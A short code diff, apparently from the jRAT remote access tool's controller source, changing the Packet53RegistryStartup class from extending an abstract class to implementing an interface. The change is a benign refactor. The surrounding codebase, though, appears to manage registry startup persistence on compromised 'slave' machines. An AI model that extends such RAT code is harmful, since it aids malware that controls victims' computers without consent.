@@ -5,7 +5,7 @@ import jrat.controller.ui.frames.FrameControlPanel;
 import jrat.controller.ui.panels.PanelControlRegStart;
 
 
-public class Packet53RegistryStartup extends AbstractIncomingPacket {
+public class Packet53RegistryStartup implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
